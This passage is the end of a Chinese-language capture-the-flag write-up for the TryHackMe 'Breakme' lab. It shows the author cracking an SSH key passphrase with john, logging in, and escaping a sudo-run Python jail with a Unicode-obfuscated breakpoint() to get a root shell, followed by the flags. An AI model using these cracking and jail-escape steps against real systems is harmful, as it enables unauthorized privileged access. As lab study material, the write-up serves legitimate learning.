KEY-----\nb3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6\nTuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z\n.......\ng6a2xx9zV89mfWvuvrXDBX2VkdnvdvDHQRx+3SElSk1k3Votzw/q383ta6Jl3EC/1Uh8RT\nTabCXd2Ji/Y7UvM=\n-----END OPENSSH PRIVATE KEY-----\n</code></pre>\n<p>我们拿到私钥准备进行登陆的时候发现加密了</p>\n<pre><code class=\"hljs language-bash\">➜  Breakme ssh youcef@10.10.68.166 -i id_rsa\nThe authenticity of host <span class=\"hljs-string\">''</span>10.10.68.166 (10.10.68.166)<span class=\"hljs-string\">' can'</span>t be established.\nED25519 key fingerprint is SHA256:7C+7KD5sXHHAuUddL4pe+CYqXj7LEWGqlWATdS4wRw8.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:139: [hashed name]\nAre you sure you want to <span class=\"hljs-built_in\">continue</span> connecting (<span class=\"hljs-built_in\">yes</span>/no/[fingerprint])? <span class=\"hljs-built_in\">yes</span>\nWarning: Permanently added <span class=\"hljs-string\">'10.10.68.166'</span> (ED25519) to the list of known hosts.\nEnter passphrase <span class=\"hljs-keyword\">for</span> key <span class=\"hljs-string\">'id_rsa'</span>: \n</code></pre>\n<p>使用 <code>john</code> 来破解</p>\n<pre><code class=\"hljs language-bash\">➜  Breakme ssh2john id_rsa > <span class=\"hljs-built_in\">hash</span> \n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Breakme john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>\nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class=\"hljs-keyword\">for</span> all loaded hashes\nCost 2 (iteration count) is 16 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 16 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\na123456          (id_rsa)     \n1g 0:00:00:14 DONE (2025-05-28 07:11) 0.07042g/s 54.08p/s 54.08c/s 54.08C/s dominic..123qwe\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>得到密码 <code>a123456</code></p>\n<pre><code class=\"hljs language-bash\">➜  Breakme ssh youcef@10.10.68.166 -i id_rsa                    \nEnter passphrase <span class=\"hljs-keyword\">for</span> key <span class=\"hljs-string\">'id_rsa'</span>: \nLinux Breakme 5.10.0-8-amd64 <span class=\"hljs-comment\">#1 SMP Debian 5.10.46-4 (2021-08-03) x86_64</span>\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> each program are described <span class=\"hljs-keyword\">in</span> the\nindividual files <span class=\"hljs-keyword\">in</span> /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Mar 21 07:55:16 2024 from 192.168.56.1\nyoucef@Breakme:~$ \n</code></pre>\n<h2>提权 - To Root</h2>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">youcef@Breakme:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> youcef on breakme:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser youcef may run the following commands on breakme:\n    (root) NOPASSWD: /usr/bin/python3 /root/jail.py\n</code></pre>\n<p>运行，貌似只能输入数字，输入字母会输出<code>Wrong Input</code></p>\n<pre><code class=\"hljs language-bash\">youcef@Breakme:~$ <span class=\"hljs-built_in\">sudo</span> python3 /root/jail.py\n  Welcome to Python jail  \n  Will you stay locked forever  \n  Or will you BreakMe  \n>> \n</code></pre>\n<p>通过收缩引擎搜索，<strong>Pyjail</strong> 是一种 <code>CTF</code> 的题型（知识盲区）</p>\n<p>通过文章：<a href=\"https://xz.aliyun.com/news/12093\">https://xz.aliyun.com/news/12093</a> 以及 <a href=\"https://shirajuki.js.org/blog/pyjail-cheatsheet\">https://shirajuki.js.org/blog/pyjail-cheatsheet</a></p>\n<p>最后能通过</p>\n<pre><code class=\"hljs language-bash\">𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()\n</code></pre>\n<p>PS：<code>breakpoint()</code> 是 Python 3.7 及以上版本内置的调试函数，用于在代码中设置断点，使程序执行到此处时暂停并进入交互式调试模式</p>\n<p>来执行任意<code>python</code>语句</p>\n<pre><code class=\"hljs language-bash\">youcef@Breakme:~$ <span class=\"hljs-built_in\">sudo</span> python3 /root/jail.py\n  Welcome to Python jail  \n  Will you stay locked forever  \n  Or will you BreakMe  \n>> 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()\n--Return--\n> &#x3C;string>(1)&#x3C;module>()->None\n(Pdb) import os;os.system(<span class=\"hljs-string\">'/bin/bash -p'</span>)\nroot@Breakme:/home/youcef# \n</code></pre>\n<p>读取剩余的两个 <code>flag</code></p>\n<pre><code class=\"hljs language-bash\">root@Breakme:~# <span class=\"hljs-built_in\">cat</span> /home/youcef/.ssh/user2.txt\ndf5b1b7f4f74a416ae27673b22633c1b\n\nroot@Breakme:~# <span class=\"hljs-built_in\">cat</span> .root.txt\ne257d58481412f8772e9fb9fd47d8ca4\n</code></pre>\n<h2>总结</h2>\n<p>感觉不是 medium，对我来说更像是 Hard，新的知识点太多了，真的无从下手，比前面的 Hard 的 Robots 还要难做…</p>\n<p>其中<code>TOCTTOU</code>和<code>pyjail</code>都是新的知识点</p>","title":"TryHackMe - Breakme","date":"2025-05-28","updated":"2025-05-28","tags":["TryHackMe","Linux靶机","CommandInject","Pyjail","TOCTOU","WordPress"],"categories":"靶机","comments":true},"recentPosts":[{"id":"PWN - 基本ROP","title":"PWN - 基本ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"},{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"}]},"__N_SSG":true}